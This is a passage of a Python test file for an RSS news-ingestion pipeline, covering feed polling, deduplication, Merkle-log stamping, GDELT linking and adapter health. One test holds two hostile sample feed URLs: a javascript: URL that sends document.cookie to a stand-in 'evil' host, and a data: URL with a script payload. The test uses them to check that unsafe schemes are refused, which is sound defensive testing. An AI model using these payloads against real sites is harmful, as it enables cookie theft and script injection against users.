    body = _rss_with_links("x1", "x2")
    with patch.object(rss_evidence, "fetch_feed_polite", return_value=(200, body, None, None, None)):
        report = await rss_evidence.refresh(
            states, [FEED_A], now_fn=lambda tz: FIXED_NOW, extract=_extract_short
        )
    assert report.items_seen == 2
    assert report.items == []
    assert report.body_fetches == 2

    with patch.object(rss_evidence, "fetch_feed_polite", return_value=(200, body, None, None, None)):
        report = await rss_evidence.refresh(
            states, [FEED_A], now_fn=lambda tz: FIXED_NOW, extract=_extract_none
        )
    assert report.items == []


async def test_refresh_empty_feed_clears_last_yield():
    """A 200 with zero items is not a yield, so the base cadence applies again."""
    states = {
        "bbc_world": rss_evidence.FeedState(last_yield_ts=FIXED_NOW.timestamp() - 10_000)
    }
    empty = b'<?xml version="1.0"?><rss version="2.0"><channel><title>Empty</title></channel></rss>'
    with patch.object(
        rss_evidence, "fetch_feed_polite", return_value=(200, empty, None, None, None)
    ):
        await rss_evidence.refresh(
            states, [FEED_A], now_fn=lambda tz: FIXED_NOW, extract=_extract_ok
        )
    assert states["bbc_world"].last_yield_ts is None


def test_evidence_feeds_are_the_verified_four():
    """Exactly the four verified feeds, each tier-1 with its domain and URL."""
    assert [f["key"] for f in rss_evidence.EVIDENCE_FEEDS] == [
        "bbc_world",
        "guardian_world",
        "npr_news",
        "france24_en",
    ]
    assert [f["url"] for f in rss_evidence.EVIDENCE_FEEDS] == [
        "https://feeds.bbci.co.uk/news/world/rss.xml",
        "https://www.theguardian.com/world/rss",
        "https://feeds.npr.org/1001/rss.xml",
        "https://www.france24.com/en/rss",
    ]
    assert [f["domain"] for f in rss_evidence.EVIDENCE_FEEDS] == [
        "bbc.co.uk",
        "theguardian.com",
        "npr.org",
        "france24.com",
    ]
    assert [f["name"] for f in rss_evidence.EVIDENCE_FEEDS] == [
        "BBC",
        "The Guardian",
        "NPR",
        "France 24",
    ]
    assert all(f["tier"] == SourceTier.TIER1 for f in rss_evidence.EVIDENCE_FEEDS)


# -------------------------------------------------------------- build_articles


def _item(url="https://www.bbc.co.uk/news/world-1", domain="bbc.co.uk"):
    return {
        "url": url,
        "title": "A title",
        "body_text": LONG_BODY,
        "summary": "A summary",
        "source_domain": domain,
        "source_name": domain,
        "source_key": "bbc_world",
        "source_tier": SourceTier.TIER1,
        "published_at": datetime(2026, 9, 30, 14, 5, tzinfo=timezone.utc),
        "body_sha256": "hash-of-body",
    }


async def test_build_articles_maps_every_field():
    """The item dict becomes a RawArticle with the evidence fields populated."""
    with patch.object(rss_evidence, "extract_entities_top_n", return_value={"ORG": ["BBC"]}):
        articles = await rss_evidence.build_articles([_item()], known_url_hashes=set())

    assert len(articles) == 1
    article = articles[0]
    assert article.url == "https://www.bbc.co.uk/news/world-1"
    assert article.url_hash == compute_url_hash("https://www.bbc.co.uk/news/world-1")
    assert article.title == "A title"
    assert article.body_text == LONG_BODY
    assert article.summary == "A summary"
    assert article.source_domain == "bbc.co.uk"
    assert article.source_tier == SourceTier.TIER1
    assert article.published_at == datetime(2026, 9, 30, 14, 5, tzinfo=timezone.utc)
    assert article.entities == {"ORG": ["BBC"]}
    assert article.content_hash == "hash-of-body"
    # Batch C columns are not in the dev DB yet; the backfill script owns them.
    assert article.canonical_url_v1 is None
    assert article.url_hash_v1 is None


async def test_build_articles_computes_hash_when_absent():
    """A missing body_sha256 is computed rather than left null."""
    from src.utils.trafilatura_extract import compute_content_hash

    item = _item()
    item.pop("body_sha256")
    with patch.object(rss_evidence, "extract_entities_top_n", return_value={}):
        articles = await rss_evidence.build_articles([item], known_url_hashes=set())
    assert articles[0].content_hash == compute_content_hash(LONG_BODY)


async def test_build_articles_dedupes_known_and_within_batch():
    """Known hashes and within-batch repeats both drop."""
    known = compute_url_hash("https://www.bbc.co.uk/news/world-2")
    items = [
        _item("https://www.bbc.co.uk/news/world-1"),
        _item("https://www.bbc.co.uk/news/world-1"),  # within-batch repeat
        _item("https://www.bbc.co.uk/news/world-2"),  # already in the DB
        _item("https://www.bbc.co.uk/news/world-3"),
    ]
    with patch.object(rss_evidence, "extract_entities_top_n", return_value={}):
        articles = await rss_evidence.build_articles(items, known_url_hashes={known})

    assert [a.url for a in articles] == [
        "https://www.bbc.co.uk/news/world-1",
        "https://www.bbc.co.uk/news/world-3",
    ]


async def test_build_articles_url_hash_is_canonical():
    """Two spellings of the same URL collapse on url_hash, so matching is canonical."""
    with patch.object(rss_evidence, "extract_entities_top_n", return_value={}):
        articles = await rss_evidence.build_articles(
            [
                _item("https://www.bbc.co.uk/news/world-9"),
                _item("http://www.bbc.co.uk/news/world-9?utm_source=rss#top"),
            ],
            known_url_hashes=set(),
        )
    assert len(articles) == 1


async def test_build_articles_accepts_no_known_hashes():
    """known_url_hashes is optional and defaults to an empty set."""
    with patch.object(rss_evidence, "extract_entities_top_n", return_value={}):
        articles = await rss_evidence.build_articles([_item()])
    assert len(articles) == 1


async def test_build_articles_refuses_unsafe_url_schemes(caplog):
    """S-P1-4: a javascript: (or data:, ...) URL from a feed is refused at
    ingestion, not persisted. The item never becomes a RawArticle."""
    bad = _item(url="javascript:fetch('//evil/'+document.cookie)")
    worse = _item(url="data:text/html,<script>alert(1)</script>")
    with patch.object(rss_evidence, "extract_entities_top_n", return_value={}):
        articles = await rss_evidence.build_articles([_item(), bad, worse])
    assert len(articles) == 1
    assert articles[0].url == "https://www.bbc.co.uk/news/world-1"
    assert "unsafe URL scheme" in caplog.text


# ------------------------------------------------------------------ stamping


async def test_stamp_payload_shape_includes_fetched_at_inside():
    """The payload shape is exactly the documented one, fetched_at included."""
    articles = [_persisted_article(0), _persisted_article(1)]
    log = InMemoryMerkleLog()
    result = await rss_evidence.stamp_observations(MagicMock(), articles, merkle_log=log)

    assert result["stamped"] == 2
    assert result["table_missing"] is False
    assert [entry[2] for entry in result["entries"]] == [0, 1]

    payload = log._entries[0].payload
    assert set(payload) == {"type", "url", "source_domain", "fetched_at", "body_sha256", "title", "article_id"}
    assert payload["type"] == "rss_evidence"
    assert payload["url"] == articles[0].url
    assert payload["source_domain"] == "bbc.co.uk"
    assert payload["body_sha256"] == articles[0].content_hash
    assert payload["title"] == "Title 0"
    # S-P1-2: the leaf binds the article id, so the proof permalink can verify
    # the entry was stamped for the article it is shown under.
    assert payload["article_id"] == str(articles[0].id)
    # The fetch time is inside the payload, which is what makes the chain commit
    # to when the bytes were read rather than only that they were read.
    parsed = datetime.fromisoformat(payload["fetched_at"])
    assert parsed.tzinfo is not None


async def test_stamp_merkle_leaf_hashes_match_canonical_payload():
    """leaf_hash is sha256 over the canonical payload bytes, verifiable after."""
    articles = [_persisted_article(0), _persisted_article(1)]
    log = InMemoryMerkleLog()
    result = await rss_evidence.stamp_observations(MagicMock(), articles, merkle_log=log)

    entries = await log.entries()
    assert verify_chain(entries) is True
    for (url, leaf_hex, index), entry in zip(result["entries"], entries):
        assert url == entry.payload["url"]
        assert leaf_hex == entry.leaf_hash_hex
        assert index == entry.index


async def test_stamp_skips_articles_without_ids():
    """An unflushed row has no id to stamp or hang edges off, so it is skipped."""
    unflushed = RawArticle(
        url="https://www.bbc.co.uk/news/world-x",
        url_hash="0" * 64,
        title="No id",
        source_domain="bbc.co.uk",
        source_tier=SourceTier.TIER1,
        content_hash="c" * 64,
    )
    assert unflushed.id is None
    log = InMemoryMerkleLog()
    result = await rss_evidence.stamp_observations(MagicMock(), [unflushed], merkle_log=log)
    assert result["stamped"] == 0
    assert result["unstamped"] == []


async def test_stamp_missing_table_disables_for_the_run_and_keeps_provenance():
    """The first missing-table error disables stamping but loses nothing."""
    articles = [_persisted_article(i) for i in range(3)]

    class BrokenLog:
        def __init__(self):
            self.calls = 0

        async def append(self, payload):
            self.calls += 1
            raise ProgrammingError(
                "INSERT INTO merkle_log_entries ...",
                None,
                Exception('relation "merkle_log_entries" does not exist'),
            )

    log = BrokenLog()
    result = await rss_evidence.stamp_observations(MagicMock(), articles, merkle_log=log)

    assert result["table_missing"] is True
    assert result["stamped"] == 0
    assert result["entries"] == []
    assert log.calls == 1, "stamping stops after the first missing-table error"
    # Provenance survives so a later step can stamp retroactively.
    assert len(result["unstamped"]) == 3
    assert {entry["body_sha256"] for entry in result["unstamped"]} == {
        a.content_hash for a in articles
    }
    assert {entry["source_domain"] for entry in result["unstamped"]} == {"bbc.co.uk"}
    assert {entry["url"] for entry in result["unstamped"]} == {a.url for a in articles}


async def test_stamp_reraises_non_missing_table_errors():
    """A real fault is not silently absorbed as a missing table."""

    class BrokenLog:
        async def append(self, payload):
            raise ProgrammingError(
                "INSERT ...", None, Exception("permission denied for table raw_articles")
            )

    with pytest.raises(ProgrammingError):
        await rss_evidence.stamp_observations(
            MagicMock(), [_persisted_article(0)], merkle_log=BrokenLog()
        )


def test_is_missing_table_classifier():
    """Only "relation does not exist" counts; other faults do not."""
    missing = ProgrammingError(
        "x", None, Exception('relation "merkle_log_entries" does not exist')
    )
    assert rss_evidence._is_missing_table(missing) is True

    undefined_code = ProgrammingError("x", None, Exception("asyncpg.exceptions.UndefinedTableError"))
    assert rss_evidence._is_missing_table(undefined_code) is True

    other_db_error = ProgrammingError("x", None, Exception("permission denied"))
    assert rss_evidence._is_missing_table(other_db_error) is False
    assert rss_evidence._is_missing_table(ValueError("boom")) is False


async def test_stamp_against_real_session_without_merkle_table(db_session):
    """A real session lacking the table keeps the run going, transaction intact.

    This is the actual dev condition: Base.metadata.create_all does not include
    TransparencyBase, so merkle_log_entries genuinely does not exist. The
    savepoint is what keeps the session usable afterwards, which the follow-up
    execute and flush in the same transaction assert.
    """
    article = _persisted_article(0)
    db_session.add(article)
    await db_session.flush()

    result = await rss_evidence.stamp_observations(db_session, [article])

    assert result["table_missing"] is True
    assert result["stamped"] == 0
    assert len(result["unstamped"]) == 1
    assert result["unstamped"][0]["body_sha256"] == article.content_hash

    # The transaction survived: this session can still execute and flush.
    await db_session.execute(text("SELECT 1"))
    await db_session.flush()


# -------------------------------------------------------------- GDELT linking


class _ScalarResult:
    def __init__(self, values):
        self._values = list(values)

    def scalars(self):
        return self

    def all(self):
        return self._values

    def first(self):
        return self._values[0] if self._values else None

    def scalar_one_or_none(self):
        assert len(self._values) <= 1, "this mock is only used for at-most-one-row queries"
        return self._values[0] if self._values else None


class _LinkSession:
    """Mock session answering the two link queries in script order."""

    def __init__(self, matches, existing_edge=False):
        self._matches = matches
        self._existing = existing_edge
        self.added: list = []
        self.executed = 0

    async def execute(self, stmt):
        self.executed += 1
        if self.executed % 2 == 1:
            return _ScalarResult(self._matches)
        return _ScalarResult([1] if self._existing else [])

    def add(self, obj):
        self.added.append(obj)

    async def flush(self):
        return None


async def test_link_to_gdelt_radar_matches_by_url_hash():
    """A GDELT row with the same url_hash gets one SAME_EVENT_AS edge at 100."""
    new_article = _persisted_article(0)
    new_article.url = "https://www.bbc.co.uk/news/world-77"
    new_article.url_hash = compute_url_hash(new_article.url)

    gdelt_row = _persisted_article(1, domain="gdeltproject.org")
    gdelt_row.url = new_article.url
    gdelt_row.url_hash = new_article.url_hash
    gdelt_row.entities = {"EVENT": ["Protest"], "GPE": ["Kyiv"]}

    session = _LinkSession([gdelt_row])
    result = await rss_evidence.link_to_gdelt_radar(session, [new_article])

    assert result["gdelt_links"] == 1
    assert result["gdelt_event_confirmed"] == 1, "an EVENT key is GDELT radar confirmation"
    assert result["links"][0]["gdelt_event_entity"] is True
    assert result["links"][0]["matched_domain"] == "gdeltproject.org"
    assert result["links"][0]["rss_article_id"] == str(new_article.id)

    edge = session.added[0]
    assert isinstance(edge, EntityEdge)
    assert edge.subject_type == "article"
    assert edge.subject_id == new_article.id
    assert edge.predicate == EdgePredicate.SAME_EVENT_AS
    assert edge.object_type == "article"
    assert edge.object_id == gdelt_row.id
    assert edge.confidence == 100


async def test_link_records_no_event_entity_when_entities_lack_event():
    """A URL match without an EVENT key is recorded, but not called confirmed."""
    gdelt_row = _persisted_article(1)
    gdelt_row.entities = {"GPE": ["Paris"]}
    result = await rss_evidence.link_to_gdelt_radar(
        _LinkSession([gdelt_row]), [_persisted_article(0)]
    )
    assert result["gdelt_links"] == 1
    assert result["gdelt_event_confirmed"] == 0
    assert result["links"][0]["gdelt_event_entity"] is False


async def test_link_skips_self_match_and_null_entities():
    """The article never links to itself, and non-dict entities are tolerated."""
    article = _persisted_article(0)
    other = _persisted_article(1)
    other.entities = None
    session = _LinkSession([article, other])
    result = await rss_evidence.link_to_gdelt_radar(session, [article])
    assert result["gdelt_links"] == 1
    assert len(session.added) == 1
    assert session.added[0].object_id == other.id


async def test_link_skips_existing_edges():
    """A re-run does not duplicate an edge that already exists."""
    session = _LinkSession([_persisted_article(1)], existing_edge=True)
    result = await rss_evidence.link_to_gdelt_radar(session, [_persisted_article(0)])
    assert result["gdelt_links"] == 0
    assert result["skipped_existing"] == 1
    assert session.added == []


async def test_link_no_match_is_not_an_error():
    """No GDELT row for a URL is the common case, not a failure."""
    result = await rss_evidence.link_to_gdelt_radar(
        _LinkSession([]), [_persisted_article(0)]
    )
    assert result == {
        "gdelt_links": 0,
        "links": [],
        "gdelt_event_confirmed": 0,
        "skipped_existing": 0,
    }


async def test_link_skips_articles_without_ids():
    """An unflushed article is not queried at all."""
    unflushed = RawArticle(
        url="https://www.bbc.co.uk/news/world-y",
        url_hash="0" * 64,
        title="No id",
        source_domain="bbc.co.uk",
        source_tier=SourceTier.TIER1,
    )
    session = _LinkSession([])
    result = await rss_evidence.link_to_gdelt_radar(session, [unflushed])
    assert result["gdelt_links"] == 0
    assert session.executed == 0


async def test_link_queries_by_url_hash_column():
    """The join really is a url_hash predicate, not a URL string compare."""
    captured = []

    class CaptureSession(_LinkSession):
        async def execute(self, stmt):
            captured.append(str(stmt))
            return await super().execute(stmt)

    session = CaptureSession([_persisted_article(1)])
    await rss_evidence.link_to_gdelt_radar(session, [_persisted_article(0)])
    assert "raw_articles.url_hash" in captured[0], "matched on url_hash, not the url string"
    assert "entity_edges.subject_id" in captured[1], "the edge-exists check is a real query"
    assert "entity_edges.predicate" in captured[1]


# --------------------------------------------------------------- orchestration


def _refresh_kwargs(session, tmp_path, body=RSS20_BYTES, **overrides):
    kwargs = dict(
        session=session,
        feeds=[FEED_A],
        state_store_path=tmp_path / "state.json",
        known_url_hashes=set(),
        now_fn=lambda tz: FIXED_NOW,
        extract=_extract_ok,
        merkle_log=_MemoryLog(),
    )
    kwargs.update(overrides)
    return kwargs


async def _run_refresh(session, tmp_path, body=RSS20_BYTES, fetch=None, **overrides):
    """run_evidence_refresh with network, clock, NER and state writing stubbed.

    Only the session is real, so the sinks run against actual SQL.
    """
    return_value = fetch if fetch is not None else (200, body, None, None, None)
    with patch.object(rss_evidence, "extract_entities_top_n", return_value={"ORG": ["BBC"]}):
        with patch.object(rss_evidence, "save_feed_state", side_effect=lambda s, p=None: None):
            with patch.object(
                rss_evidence, "fetch_feed_polite", return_value=return_value
            ):
                return await rss_evidence.run_evidence_refresh(
                    **_refresh_kwargs(session, tmp_path, body, **overrides)
                )


async def test_run_evidence_refresh_happy_path(db_session, tmp_path):
    """A full refresh reports every documented key and persists the rows."""
    result = await _run_refresh(db_session, tmp_path)

    assert result["feeds_polled"] == ["bbc_world"]
    assert result["feeds_skipped"] == []
    assert result["feeds_deferred_by_cap"] == []
    assert result["feeds_failed"] == []
    assert result["items_seen"] == 3
    assert result["articles_new"] == 3
    assert result["articles_persisted"] == 3
    assert result["gdelt_links"] == 0
    assert result["stamped"] == 3
    assert result["sinks"] == {"ledger": "ok", "merkle": "ok", "edges": "ok"}
    assert len(result["samples"]) == 3
    assert set(result["samples"][0]) == {"title", "url"}
    assert len(result["_articles"]) == 3

    count = (
        await db_session.execute(select(func.count()).select_from(RawArticle))
    ).scalar_one()
    assert count == 3

    stage = (
        await db_session.execute(
            select(PipelineRun).where(PipelineRun.stage == "ingest_rss_evidence")
        )
    ).scalar_one()
    assert stage.items_in == 3
    assert stage.items_out == 3
    assert stage.finished_at is not None
    assert stage.error is None


async def test_run_evidence_refresh_merkle_missing_table_continues(db_session, tmp_path):
    """A missing merkle_log_entries disables stamping but keeps the rows.

    db_session's schema comes from Base.metadata, and MerkleLogEntry lives on
    TransparencyBase, which scripts/check_schema.py and the migrations keep separate --
    so the table genuinely does not exist here. This is the real dev path, not a mock.
    """
    result = await _run_refresh(db_session, tmp_path, merkle_log=None)

    assert result["sinks"]["merkle"] == "missing_table"
    assert result["sinks"]["ledger"] == "ok"
    assert result["sinks"]["edges"] == "ok"
    assert result["stamped"] == 0
    assert result["articles_persisted"] == 3
    assert len(result["unstamped"]) == 3
    assert all(entry["body_sha256"] for entry in result["unstamped"])

    count = (
        await db_session.execute(select(func.count()).select_from(RawArticle))
    ).scalar_one()
    assert count == 3


async def test_stamp_against_real_sqlalchemy_merkle_log(tmp_path):
    """The real SqlAlchemyMerkleLog path, against a schema that HAS the table.

    The missing-table tests prove the defensive branch. This proves the live
    one: a real append chain, written through SQLAlchemy, whose leaf hashes
    verify afterwards. MerkleLogEntry lives on TransparencyBase, so the test has to
    create its table explicitly.
    """
    from src.transparency.log import MerkleLogEntry, SqlAlchemyMerkleLog

    engine = await _engine_with([RawArticle.__table__, MerkleLogEntry.__table__])
    try:
        async with sa_asyncio.async_sessionmaker(
            engine, class_=AsyncSession, expire_on_commit=False
        )() as session:
            articles = [_persisted_article(i) for i in range(3)]
            for a in articles:
                session.add(a)
            await session.flush()

            log = SqlAlchemyMerkleLog(session)
            result = await rss_evidence.stamp_observations(session, articles, merkle_log=log)
            await session.commit()

            assert result["table_missing"] is False
            assert result["stamped"] == 3
            assert result["unstamped"] == []
            assert [e[2] for e in result["entries"]] == [0, 1, 2]

            stored = await log.entries()
            assert len(stored) == 3
            assert verify_chain(stored) is True
            assert all(e.payload["type"] == "rss_evidence" for e in stored)
            assert all(e.payload["body_sha256"] == a.content_hash
                       for e, a in zip(stored, articles))
            assert await log.size() == 3
    finally:
        await engine.dispose()


async def test_run_evidence_refresh_ledger_missing_table_continues(tmp_path):
    """A missing pipeline_runs must not sink the run: sinks.ledger says so.

    Built on a schema that has raw_articles and entity_edges but not
    pipeline_runs, which is the dev condition.
    """
    engine = await _engine_with([RawArticle.__table__, EntityEdge.__table__])
    maker = sa_asyncio.async_sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)
    try:
        async with maker() as session:
            result = await _run_refresh(session, tmp_path)
            count = (
                await session.execute(select(func.count()).select_from(RawArticle))
            ).scalar_one()
            # The premise of this test, asserted: the table really is absent.
            present = (
                await session.execute(
                    text(
                        "SELECT name FROM sqlite_master "
                        "WHERE type='table' AND name='pipeline_runs'"
                    )
                )
            ).scalars().all()
            await session.commit()
    finally:
        await engine.dispose()

    assert result["sinks"]["ledger"] == "missing_table"
    assert result["sinks"]["merkle"] == "ok"
    assert result["sinks"]["edges"] == "ok"
    assert result["articles_persisted"] == 3
    assert count == 3, "the articles survive the ledger failure"
    assert present == [], "pipeline_runs was genuinely missing for this test"


async def test_run_evidence_refresh_reads_known_hashes_when_not_supplied(db_session, tmp_path):
    """With no caller knowledge, the run asks the database what it has."""
    existing = _persisted_article(0)
    existing.url = "https://www.bbc.co.uk/news/world-12345678"
    existing.url_hash = compute_url_hash(existing.url)
    db_session.add(existing)
    await db_session.flush()

    result = await _run_refresh(db_session, tmp_path, known_url_hashes=None)

    assert result["articles_new"] == 2, "the row already in the DB is skipped"
    assert {a["url"] for a in result["samples"]} == {
        "https://www.bbc.co.uk/news/world-87654321",
        "https://www.bbc.co.uk/news/world-11223344",
    }


async def test_raw_articles_url_hash_is_unique_today(tmp_path):
    """Why the GDELT join needs a migration to become live, asserted not assumed.

    raw_articles carries a UNIQUE index on url_hash, so two rows cannot share a
    canonical URL and the url_hash join can only ever find the article itself.
    link_to_gdelt_radar is written and unit tested for the case where the index
    is gone, which is what the later inclusion-proofs step has to settle.
    """
    engine = await _engine_with(list(Base.metadata.tables.values()))
    try:
        async with sa_asyncio.async_sessionmaker(engine, class_=AsyncSession)() as session:
            first = _persisted_article(0, url="https://www.bbc.co.uk/news/world-12345678")
            first.url_hash = compute_url_hash(first.url)
            second = _persisted_article(99, domain="gdeltproject.org")
            second.url = first.url
            second.url_hash = first.url_hash
            session.add_all([first, second])
            with pytest.raises(IntegrityError):
                await session.flush()
            await session.rollback()
    finally:
        await engine.dispose()


async def test_run_evidence_refresh_links_gdelt_matches(tmp_path):
    """With the unique index dropped, a GDELT row on the same URL gets an edge."""
    engine = await _engine_with(list(Base.metadata.tables.values()))
    try:
        async with engine.begin() as conn:
            await conn.execute(text("DROP INDEX ix_raw_articles_url_hash"))
        async with sa_asyncio.async_sessionmaker(
            engine, class_=AsyncSession, expire_on_commit=False
        )() as session:
            gdelt_row = _persisted_article(99, domain="gdeltproject.org")
            gdelt_row.url = "https://www.bbc.co.uk/news/world-12345678"
            gdelt_row.url_hash = compute_url_hash(gdelt_row.url)
            gdelt_row.entities = {"EVENT": ["Ceasefire talks"]}
            session.add(gdelt_row)
            await session.flush()

            result = await _run_refresh(session, tmp_path)

            assert result["gdelt_links"] == 1
            assert result["gdelt_event_confirmed"] == 1
            assert result["gdelt_link_detail"][0]["gdelt_event_entity"] is True
            assert result["gdelt_link_detail"][0]["rss_article_id"] != str(gdelt_row.id)

            edges = (
                await session.execute(
                    select(EntityEdge).where(
                        EntityEdge.predicate == EdgePredicate.SAME_EVENT_AS
                    )
                )
            ).scalars().all()
            assert len(edges) == 1
            assert edges[0].subject_type == "article"
            assert edges[0].object_type == "article"
            assert edges[0].object_id == gdelt_row.id
            assert edges[0].confidence == 100

            # Re-linking the same rows adds nothing: the edge-exists check
            # makes the sink idempotent rather than appending on every run.
            again = await rss_evidence.link_to_gdelt_radar(
                session, [result["_articles"][0]]
            )
            assert again["gdelt_links"] == 0
            assert again["skipped_existing"] == 1
    finally:
        await engine.dispose()


async def test_run_evidence_refresh_records_cap_deferral_in_ledger(db_session, tmp_path):
    """Feeds deferred by the body cap are attributed in the ledger drops."""
    feed_a = dict(FEED_A, url="https://a.invalid/rss")
    feed_b = dict(FEED_B, url="https://b.invalid/rss")
    body_a = _rss_with_links(*[f"a{i}" for i in range(8)])
    body_b = _rss_with_links(*[f"b{i}" for i in range(8)], prefix="https://b.invalid/")

    with patch.object(rss_evidence, "extract_entities_top_n", return_value={}):
        with patch.object(rss_evidence, "save_feed_state", side_effect=lambda s, p=None: None):
            with patch.object(
                rss_evidence,
                "fetch_feed_polite",
                side_effect=[
                    (200, body_a, None, None, None),
                    (200, body_b, None, None, None),
                ],
            ):
                result = await rss_evidence.run_evidence_refresh(
                    **_refresh_kwargs(
                        db_session, tmp_path, feeds=[feed_a, feed_b]
                    )
                )

    assert result["items_seen"] == 16
    assert result["articles_new"] == 10
    assert result["entries_skipped_by_cap"] == 6
    assert result["feeds_deferred_by_cap"] == ["npr_news"]

    stage = (
        await db_session.execute(
            select(PipelineRun).where(PipelineRun.stage == "ingest_rss_evidence")
        )
    ).scalar_one()
    assert stage.items_in == 16
    assert stage.items_out == 10
    assert stage.items_dropped_by_reason["deferred_by_cap"] == 1
    assert stage.items_dropped_by_reason["cap_skipped"] == 6
    assert stage.items_dropped_by_reason["deduped"] == 0


async def test_run_evidence_refresh_persists_state_file(db_session, tmp_path):
    """The poller's validators land on disk so the next process can reuse them."""
    path = tmp_path / "state.json"
    result = await _run_refresh(
        db_session,
        tmp_path,
        fetch=(200, RSS20_BYTES, 'W/"persisted"', "Wed, 30 Sep 2026 14:05:00 GMT", None),
    )
    assert result["articles_new"] == 3
    assert not path.exists(), "save_feed_state was stubbed in this test"

    with patch.object(rss_evidence, "extract_entities_top_n", return_value={}):
        with patch.object(
            rss_evidence,
            "fetch_feed_polite",
            return_value=(200, RSS20_BYTES, 'W/"persisted"', "Wed, 30 Sep 2026 14:05:00 GMT", None),
        ):
            await rss_evidence.run_evidence_refresh(
                **_refresh_kwargs(db_session, tmp_path, known_url_hashes=None)
            )

    saved = rss_evidence.load_feed_state(path)
    assert saved["bbc_world"].etag == 'W/"persisted"'
    assert saved["bbc_world"].last_modified == "Wed, 30 Sep 2026 14:05:00 GMT"
    assert saved["bbc_world"].last_poll_ts == FIXED_NOW.timestamp()
    assert saved["bbc_world"].consecutive_304s == 0


# --------------------------------------------------------------------- adapter


def test_adapter_name_and_feed_defaults():
    """The adapter names itself rss_evidence and defaults to the four feeds."""
    adapter = RssEvidenceAdapter()
    assert adapter.name == "rss_evidence"
    assert [f["key"] for f in adapter.feeds] == [f["key"] for f in rss_evidence.EVIDENCE_FEEDS]


async def test_adapter_health_down_before_first_fetch():
    """No fetch yet means down, with every feed listed as failed."""
    health = await RssEvidenceAdapter().health_check()
    assert health.status == "down"
    assert "No fetch performed yet" in health.detail
    assert set(health.failed) == {"bbc_world", "guardian_world", "npr_news", "france24_en"}


async def test_adapter_fetch_and_health_ok(db_session, tmp_path, monkeypatch):
    """A fetch persists articles and reports ok from that same fetch.

    Only get_session is stubbed; the real run_evidence_refresh runs against the
    real session with the network, clock, NER and state writing stubbed, so the
    whole adapter-to-sinks path is exercised.
    """
    monkeypatch.setenv("RSS_EVIDENCE_STATE_PATH", str(tmp_path / "state.json"))
    seen = {}

    class _SessionCtx:
        async def __aenter__(self):
            seen["session"] = db_session
            return db_session

        async def __aexit__(self, *exc):
            return False

    monkeypatch.setattr(
        "src.ingestion.adapters.rss_evidence_adapter.get_session", _SessionCtx
    )
    adapter = RssEvidenceAdapter(feeds=[FEED_A])

    with patch.object(rss_evidence, "extract_entities_top_n", return_value={"ORG": ["BBC"]}):
        with patch.object(
            rss_evidence, "fetch_feed_polite", return_value=(200, RSS20_BYTES, None, None, None)
        ):
            with patch.object(
                rss_evidence, "extract_article", side_effect=_extract_ok
            ):
                articles = await adapter.fetch()

    assert seen["session"] is db_session
    assert len(articles) == 3
    assert all(isinstance(a, RawArticle) for a in articles)
    assert all(a.id is not None for a in articles), "flush happens before fetch returns"

    count = (
        await db_session.execute(select(func.count()).select_from(RawArticle))
    ).scalar_one()
    assert count == 3

    health = await adapter.health_check()
    assert health.status == "ok"
    assert health.succeeded == ["bbc_world"]
    assert health.failed == []
    assert "3 new articles from 1 polled feeds" in health.detail
    # The adapter wrote the poller state, so the next run can send validators.
    assert rss_evidence.load_feed_state(tmp_path / "state.json")["bbc_world"].last_poll_ts


async def test_adapter_uses_the_configured_feed_list():
    """The adapter passes its own feed list to the refresh, not the module default."""
    captured = {}

    class _SessionCtx:
        async def __aenter__(self):
            return MagicMock()

        async def __aexit__(self, *exc):
            return False

    async def fake_run(session, known_url_hashes=None, feeds=None, **kwargs):
        captured["feeds"] = feeds
        return {"articles_new": 0, "sinks": {}, "_articles": []}

    with patch(
        "src.ingestion.adapters.rss_evidence_adapter.get_session", _SessionCtx
    ):
        with patch.object(rss_evidence, "run_evidence_refresh", side_effect=fake_run):
            adapter = RssEvidenceAdapter(feeds=[FEED_B])
            assert await adapter.fetch() == []
    assert captured["feeds"] == [FEED_B]


async def test_adapter_persists_language_detection(db_session, tmp_path, monkeypatch):
    """The rows this adapter writes carry detected_language, or nobody ever sets it.

    run.py sees these articles as already-present rows and skips them on the
    url_hash dedupe, so its own translation phase never touches them: detection
    has to happen here, while the session that persists them still owns them.
    Committing and re-reading proves the field is in the row and not just on an
    in-memory object the adapter is about to detach.

    The stub backend also fails if it is ever asked to translate: these articles
    are English, and an English row costs nothing (no title_en, no quota).
    """
    monkeypatch.setenv("RSS_EVIDENCE_STATE_PATH", str(tmp_path / "state.json"))

    class _SessionCtx:
        async def __aenter__(self):
            return db_session

        async def __aexit__(self, *exc):
            return False

    class _NoQuotaBackend:
        name = "no-quota"

        def translate(self, text, source_lang, target_lang="en"):
            raise AssertionError("an English row must not be sent to a translation backend")

    monkeypatch.setattr(
        "src.ingestion.adapters.rss_evidence_adapter.get_session", _SessionCtx
    )
    monkeypatch.setattr(
        "src.enrichment.translation.select_backend", lambda: _NoQuotaBackend()
    )

    with patch.object(rss_evidence, "extract_entities_top_n", return_value={"ORG": ["BBC"]}):
        with patch.object(
            rss_evidence, "fetch_feed_polite", return_value=(200, RSS20_BYTES, None, None, None)
        ):
            with patch.object(rss_evidence, "extract_article", side_effect=_extract_ok):
                await RssEvidenceAdapter(feeds=[FEED_A]).fetch()

    await db_session.commit()
    rows = (await db_session.execute(select(RawArticle))).scalars().all()
    assert len(rows) == 3
    assert all(row.detected_language == "en" for row in rows)
    # Null-for-English is the design: the reader coalesces title_en or title.
    assert all(row.title_en is None and row.body_text_en is None for row in rows)


async def test_adapter_health_degraded_on_failures_and_empty_refresh():
    """Failed feeds or zero new articles degrade the health, with no network call."""
    adapter = RssEvidenceAdapter()
    adapter._fetch_called = True
    adapter._last_result = {
        "feeds_polled": ["bbc_world", "npr_news"],
        "feeds_skipped": ["france24_en"],
        "feeds_deferred_by_cap": ["guardian_world"],
        "feeds_failed": ["npr_news"],
        "articles_new": 0,
        "sinks": {"ledger": "missing_table", "merkle": "ok", "edges": "ok"},
    }
    adapter._last_articles = []

    health = await adapter.health_check()
    assert health.status == "degraded"
    assert health.failed == ["npr_news"]
    assert health.skipped == ["france24_en"]
    assert "failed: npr_news" in health.detail
    assert "deferred by cap: guardian_world" in health.detail
    assert "not due: france24_en" in health.detail
    assert "sinks missing tables: ledger" in health.detail


async def test_adapter_health_ok_when_all_sinks_ok():
    """A clean refresh with articles reports ok and no missing sinks."""
    adapter = RssEvidenceAdapter()
    adapter._fetch_called = True
    adapter._last_result = {
        "feeds_polled": ["bbc_world"],
        "feeds_skipped": [],
        "feeds_deferred_by_cap": [],
        "feeds_failed": [],
        "articles_new": 1,
        "sinks": {"ledger": "ok", "merkle": "ok", "edges": "ok"},
    }
    adapter._last_articles = [_persisted_article(0)]

    health = await adapter.health_check()
